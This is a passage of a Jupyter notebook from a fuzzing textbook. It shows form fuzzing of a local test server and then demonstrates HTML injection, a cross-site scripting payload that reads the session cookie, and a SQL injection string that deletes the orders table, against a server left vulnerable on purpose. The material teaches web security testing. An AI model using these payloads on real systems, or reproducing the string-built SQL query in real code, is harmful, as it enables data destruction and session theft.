       "<pre><a href=\"https://www.fuzzingbook.org/html/PrototypingWithPython.html\">https://www.fuzzingbook.org/html/PrototypingWithPython.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ExpectError.html\">https://www.fuzzingbook.org/html/ExpectError.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Timer.html\">https://www.fuzzingbook.org/html/Timer.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ClassDiagram.html\">https://www.fuzzingbook.org/html/ClassDiagram.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/RailroadDiagrams.html\">https://www.fuzzingbook.org/html/RailroadDiagrams.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ControlFlow.html\">https://www.fuzzingbook.org/html/ControlFlow.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/00_Index.html\">https://www.fuzzingbook.org/html/00_Index.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/dist/fuzzingbook-code.zip\">https://www.fuzzingbook.org/dist/fuzzingbook-code.zip</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip\">https://www.fuzzingbook.org/dist/fuzzingbook-notebooks.zip</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/ReleaseNotes.html\">https://www.fuzzingbook.org/html/ReleaseNotes.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Importing.html\">https://www.fuzzingbook.org/html/Importing.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/slides/Fuzzer.slides.html\">https://www.fuzzingbook.org/slides/Fuzzer.slides.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre><a href=\"https://www.fuzzingbook.org/html/Guide_for_Authors.html\">https://www.fuzzingbook.org/html/Guide_for_Authors.html</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for url in crawl(\"https://www.fuzzingbook.org/\"):\n",
    "    print_url(url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Once we have crawled over all the links of a site, we can generate tests for all the forms we found:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.487991Z",
     "iopub.status.busy": "2021-12-13T14:45:36.486955Z",
     "iopub.status.idle": "2021-12-13T14:45:36.540608Z",
     "shell.execute_reply": "2021-12-13T14:45:36.540981Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "('http://127.0.0.1:8800/terms', 'PASS')\n",
      "('http://127.0.0.1:8800/order?item=tshirt&name=+&email=b+%742%40+&city=%45%39&zip=54&terms=on&submit=', 'PASS')\n",
      "('http://127.0.0.1:8800/order?item=drill&name=%52-&email=e%40%3f&city=+&zip=5&terms=on&submit=', 'PASS')\n"
     ]
    }
   ],
   "source": [
    "for url in crawl(httpd_url, max_pages=float('inf')):\n",
    "    web_form_fuzzer = WebFormFuzzer(url)\n",
    "    web_form_runner = WebRunner(url)\n",
    "    print(web_form_fuzzer.run(web_form_runner))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "For even better effects, one could integrate crawling and fuzzing – and also analyze the order confirmation pages for further links.  We leave this to the reader as an exercise."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us get rid of any server messages accumulated above:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.544801Z",
     "iopub.status.busy": "2021-12-13T14:45:36.544211Z",
     "iopub.status.idle": "2021-12-13T14:45:36.546825Z",
     "shell.execute_reply": "2021-12-13T14:45:36.547252Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "clear_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Crafting Web Attacks\n",
    "\n",
    "Before we close the chapter, let us take a look at a special class of \"uncommon\" inputs that not only yield generic failures, but actually allow _attackers_ to manipulate the server at their will.  We will illustrate three common attacks using our server, which (surprise) actually turns out to be vulnerable against all of them."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### HTML Injection Attacks\n",
    "\n",
    "The first kind of attack we look at is *HTML injection*.  The idea of HTML injection is to supply the Web server with _data that can also be interpreted as HTML_.  If this HTML data is then displayed to users in their Web browsers, it can serve malicious purposes, although (seemingly) originating from a reputable site.  If this data is also _stored_, it becomes a _persistent_ attack; the attacker does not even have to lure victims towards specific pages."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Here is an example of a (simple) HTML injection.  For the `name` field, we not only use plain text, but also embed HTML tags – in this case, a link towards a malware-hosting site."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.550806Z",
     "iopub.status.busy": "2021-12-13T14:45:36.550277Z",
     "iopub.status.idle": "2021-12-13T14:45:36.551992Z",
     "shell.execute_reply": "2021-12-13T14:45:36.552429Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import extend_grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.556300Z",
     "iopub.status.busy": "2021-12-13T14:45:36.555689Z",
     "iopub.status.idle": "2021-12-13T14:45:36.557304Z",
     "shell.execute_reply": "2021-12-13T14:45:36.557738Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR_WITH_HTML_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode('''\n",
    "    Jane Doe<p>\n",
    "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
    "    </p>\n",
    "    ''')],\n",
    "})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "If we use this grammar to create inputs, the resulting URL will have all of the HTML encoded in:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.562553Z",
     "iopub.status.busy": "2021-12-13T14:45:36.561934Z",
     "iopub.status.idle": "2021-12-13T14:45:36.565013Z",
     "shell.execute_reply": "2021-12-13T14:45:36.565636Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=drill&name=%0a++++Jane+Doe%3cp%3e%0a++++%3cstrong%3e%3ca+href%3d%22www.lots.of.malware%22%3eClick+here+for+cute+cat+pictures!%3c%2fa%3e%3c%2fstrong%3e%0a++++%3c%2fp%3e%0a++++&email=j_smith%40example.com&city=Seattle&zip=02805'"
      ]
     },
     "execution_count": 131,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "html_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_HTML_INJECTION)\n",
    "order_with_injected_html = html_injection_fuzzer.fuzz()\n",
    "order_with_injected_html"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "What hapens if we send this string to our Web server?  It turns out that the HTML is left in the confirmation page and shown as link.  This also happens in the log:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.569877Z",
     "iopub.status.busy": "2021-12-13T14:45:36.569261Z",
     "iopub.status.idle": "2021-12-13T14:45:36.579893Z",
     "shell.execute_reply": "2021-12-13T14:45:36.580261Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:36] INSERT INTO orders VALUES ('drill', '\n",
       "    Jane Doe<p>\n",
       "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
       "    </p>\n",
       "    ', 'j_smith@example.com', 'Seattle', '02805')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:36] \"GET /order?item=drill&name=%0A++++Jane+Doe%3Cp%3E%0A++++%3Cstrong%3E%3Ca+href%3D%22www.lots.of.malware%22%3EClick+here+for+cute+cat+pictures!%3C%2Fa%3E%3C%2Fstrong%3E%0A++++%3C%2Fp%3E%0A++++&email=j_smith%40example.com&city=Seattle&zip=02805 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Rotary Hammer</strong> to \n",
       "    Jane Doe<p>\n",
       "    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\n",
       "    </p>\n",
       "     in Seattle, 02805<br>\n",
       "  A confirmation mail will be sent to j_smith@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 132,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, order_with_injected_html)))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Since the link seemingly comes from a trusted origin, users are much more likely to follow it.  The link is even persistent, as it is stored in the database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 133,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.583958Z",
     "iopub.status.busy": "2021-12-13T14:45:36.583074Z",
     "iopub.status.idle": "2021-12-13T14:45:36.585777Z",
     "shell.execute_reply": "2021-12-13T14:45:36.586147Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('drill', '\\n    Jane Doe<p>\\n    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\\n    </p>\\n    ', 'j_smith@example.com', 'Seattle', '02805')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders WHERE name LIKE '%<%'\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "This means that anyone ever querying the database (for instance, operators processing the order) will also see the link, multiplying its impact.  By carefully crafting the injected HTML, one can thus expose malicious content to a large number of users – until the injected HTML is finally deleted."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Cross-Site Scripting Attacks\n",
    "\n",
    "If one can inject HTML code into a Web page, one can also inject *JavaScript* code as part of the injected HTML.  This code would then be executed as soon as the injected HTML is rendered.   \n",
    "\n",
    "This is particularly dangerous because executed JavaScript always executes in the _origin_ of the page which contains it. Therefore, an attacker can normally not force a user to run JavaScript in any origin he does not control himself. When an attacker, however, can inject his code into a vulnerable Web application, he can have the client run the code with the (trusted) Web application as origin.\n",
    "\n",
    "In such a *cross-site scripting* (*XSS*) attack, the injected script can do a lot more than just plain HTML.  For instance, the code can access sensitive page content or session cookies.  If the code in question runs in the operator's browser (for instance, because an operator is reviewing the list of orders), it could retrieve any other information shown on the screen and thus steal order details for a variety of customers."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Here is a very simple example of a script injection.  Whenever the name is displayed, it causes the browser to \"steal\" the current *session cookie* – the piece of data the browser uses to identify the user with the server.  In our case, we could steal the cookie of the Jupyter session."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 134,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.590557Z",
     "iopub.status.busy": "2021-12-13T14:45:36.589773Z",
     "iopub.status.idle": "2021-12-13T14:45:36.591584Z",
     "shell.execute_reply": "2021-12-13T14:45:36.592036Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR_WITH_XSS_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode('Jane Doe' +\n",
    "                          '<script>' +\n",
    "                          'document.title = document.cookie.substring(0, 10);' +\n",
    "                          '</script>')\n",
    "               ],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.596841Z",
     "iopub.status.busy": "2021-12-13T14:45:36.596251Z",
     "iopub.status.idle": "2021-12-13T14:45:36.598489Z",
     "shell.execute_reply": "2021-12-13T14:45:36.599121Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'"
      ]
     },
     "execution_count": 135,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "xss_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_XSS_INJECTION)\n",
    "order_with_injected_xss = xss_injection_fuzzer.fuzz()\n",
    "order_with_injected_xss"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 136,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.604597Z",
     "iopub.status.busy": "2021-12-13T14:45:36.603819Z",
     "iopub.status.idle": "2021-12-13T14:45:36.606741Z",
     "shell.execute_reply": "2021-12-13T14:45:36.607131Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order?item=lockset&name=Jane+Doe%3cscript%3edocument.title+%3d+document.cookie.substring(0,+10)%3b%3c%2fscript%3e&email=j.doe%40example.com&city=Seattle&zip=34506'"
      ]
     },
     "execution_count": 136,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "url_with_injected_xss = urljoin(httpd_url, order_with_injected_xss)\n",
    "url_with_injected_xss"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.611824Z",
     "iopub.status.busy": "2021-12-13T14:45:36.610853Z",
     "iopub.status.idle": "2021-12-13T14:45:36.620848Z",
     "shell.execute_reply": "2021-12-13T14:45:36.621242Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook Lock Set</strong> to Jane Doe<script>document.title = document.cookie.substring(0, 10);</script> in Seattle, 34506<br>\n",
       "  A confirmation mail will be sent to j.doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(url_with_injected_xss, mute=True))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The message looks as always – but if you have a look at your browser title, it should now show the first 10 characters of your \"secret\" notebook cookie.  Instead of showing its prefix in the title, the script could also silently send the cookie to a remote server, allowing attackers to highjack your current notebook session and interact with the server on your behalf.  It could also go and access and send any other data that is shown in your browser or otherwise available.  It could run a *keylogger* and steal passwords and other sensitive data as it is typed in.  Again, it will do so every time the compromised order with Jane Doe's name is shown in the browser and the associated script is executed."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us go and reset the title to a less sensitive value:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.625877Z",
     "iopub.status.busy": "2021-12-13T14:45:36.625205Z",
     "iopub.status.idle": "2021-12-13T14:45:36.628112Z",
     "shell.execute_reply": "2021-12-13T14:45:36.628488Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<script>document.title = \"Jupyter\"</script>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML('<script>document.title = \"Jupyter\"</script>')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### SQL Injection Attacks\n",
    "\n",
    "Cross-site scripts have the same privileges as web pages – most notably, they cannot access or change data outside of your browser.  So-called *SQL injection* targets _databases_, allowing to inject commands that can read or modify data in the database, or change the purpose of the original query."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "To understand how SQL injection works, let us take a look at the code that produces the SQL command to insert a new order into the database:\n",
    "\n",
    "```python\n",
    "sql_command = (\"INSERT INTO orders \" +\n",
    "    \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\n",
    "```\n",
    "\n",
    "What happens if any of the values (say, `name`) has a value that _can also be interpreted as a SQL command?_  Then, instead of the intended `INSERT` command, we would execute the command imposed by `name`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us illustrate this by an example.  We set the individual values as they would be found during execution:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.632218Z",
     "iopub.status.busy": "2021-12-13T14:45:36.631699Z",
     "iopub.status.idle": "2021-12-13T14:45:36.634339Z",
     "shell.execute_reply": "2021-12-13T14:45:36.633885Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "values = {\n",
    "    \"item\": \"tshirt\",\n",
    "    \"name\": \"Jane Doe\",\n",
    "    \"email\": \"j.doe@example.com\",\n",
    "    \"city\": \"Seattle\",\n",
    "    \"zip\": \"98104\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "and format the string as seen above:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.638819Z",
     "iopub.status.busy": "2021-12-13T14:45:36.638199Z",
     "iopub.status.idle": "2021-12-13T14:45:36.640633Z",
     "shell.execute_reply": "2021-12-13T14:45:36.641003Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'j.doe@example.com', 'Seattle', '98104')\""
      ]
     },
     "execution_count": 140,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_command = (\"INSERT INTO orders \" +\n",
    "               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\n",
    "sql_command"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "All fine, right?  But now, we define a very \"special\" name that can also be interpreted as a SQL command:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.644392Z",
     "iopub.status.busy": "2021-12-13T14:45:36.643732Z",
     "iopub.status.idle": "2021-12-13T14:45:36.645622Z",
     "shell.execute_reply": "2021-12-13T14:45:36.645992Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "values[\"name\"] = \"Jane', 'x', 'x', 'x'); DELETE FROM orders; -- \""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 142,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.649426Z",
     "iopub.status.busy": "2021-12-13T14:45:36.648909Z",
     "iopub.status.idle": "2021-12-13T14:45:36.651185Z",
     "shell.execute_reply": "2021-12-13T14:45:36.651617Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"INSERT INTO orders VALUES ('tshirt', 'Jane', 'x', 'x', 'x'); DELETE FROM orders; -- ', 'j.doe@example.com', 'Seattle', '98104')\""
      ]
     },
     "execution_count": 142,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_command = (\"INSERT INTO orders \" +\n",
    "               \"VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values))\n",
    "sql_command"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "What happens here is that we now get a command to insert values into the database (with a few \"dummy\" values `x`), followed by a SQL `DELETE` command that would _delete all entries_ of the orders table.  The string `-- ` starts a SQL _comment_ such that the remainder of the original query would be easily ignored.  By crafting strings that can also be interpreted as SQL commands, attackers can alter or delete database data, bypass authentication mechanisms and many more."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Is our server also vulnerable to such attacks?  Of course it is.  We create a special grammar such that we can set the `<name>` parameter to a string with SQL injection, just as shown above."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 143,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.655801Z",
     "iopub.status.busy": "2021-12-13T14:45:36.654908Z",
     "iopub.status.idle": "2021-12-13T14:45:36.656930Z",
     "shell.execute_reply": "2021-12-13T14:45:36.657571Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import extend_grammar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 144,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.660984Z",
     "iopub.status.busy": "2021-12-13T14:45:36.660445Z",
     "iopub.status.idle": "2021-12-13T14:45:36.661876Z",
     "shell.execute_reply": "2021-12-13T14:45:36.662413Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR_WITH_SQL_INJECTION = extend_grammar(ORDER_GRAMMAR, {\n",
    "    \"<name>\": [cgi_encode(\"Jane', 'x', 'x', 'x'); DELETE FROM orders; --\")],\n",
    "})"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 145,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.667209Z",
     "iopub.status.busy": "2021-12-13T14:45:36.666478Z",
     "iopub.status.idle": "2021-12-13T14:45:36.669062Z",
     "shell.execute_reply": "2021-12-13T14:45:36.669494Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"/order?item=drill&name=Jane',+'x',+'x',+'x')%3b+DELETE+FROM+orders%3b+--&email=j.doe%40example.com&city=New+York&zip=14083\""
      ]
     },
     "execution_count": 145,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "sql_injection_fuzzer = GrammarFuzzer(ORDER_GRAMMAR_WITH_SQL_INJECTION)\n",
    "order_with_injected_sql = sql_injection_fuzzer.fuzz()\n",
    "order_with_injected_sql"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "These are the current orders:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 146,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.672721Z",
     "iopub.status.busy": "2021-12-13T14:45:36.672162Z",
     "iopub.status.idle": "2021-12-13T14:45:36.674289Z",
     "shell.execute_reply": "2021-12-13T14:45:36.674654Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104'), ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631'), ('drill', 'Jane Doe', 'j.doe@example.com', '', '45732'), ('drill', 'Jane Doe', 'j,doe@example.com', 'Seattle', '45732'), ('drill', ' ', '5F @p   a ', 'cdb', '3230'), ('drill', ' m', '@@0', 'd', '9'), ('lockset', '  ', 'c@d', '_', '6'), ('lockset', ' ', 'd@_-', '2  0', '1040'), ('tshirt', 'Kb', 'm@ ', 'zy ', '13'), ('lockset', 'd', 'U @t', ' ', '4'), ('tshirt', '_ 2', '1  @ ', ' ', '30'), ('tshirt', ' ', 'a-@ ', ' W', '2'), ('lockset', 'V', '  @aUeeD', ' ', '01'), ('tshirt', 'oc', '  @ ', 'a', '25'), ('drill', '55', '3>@@5', 'L', '0'), ('tshirt', ' ', 'b t2@ ', 'E9', '54'), ('drill', 'R-', 'e@?', ' ', '5'), ('drill', '\\n    Jane Doe<p>\\n    <strong><a href=\"www.lots.of.malware\">Click here for cute cat pictures!</a></strong>\\n    </p>\\n    ', 'j_smith@example.com', 'Seattle', '02805'), ('lockset', 'Jane Doe<script>document.title = document.cookie.substring(0, 10);</script>', 'j.doe@example.com', 'Seattle', '34506')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "Let us go and send our URL with SQL injection to the server.  From the log, we see that the \"malicious\" SQL command is formed just as sketched above, and executed, too."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 147,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:36.678054Z",
     "iopub.status.busy": "2021-12-13T14:45:36.677383Z",
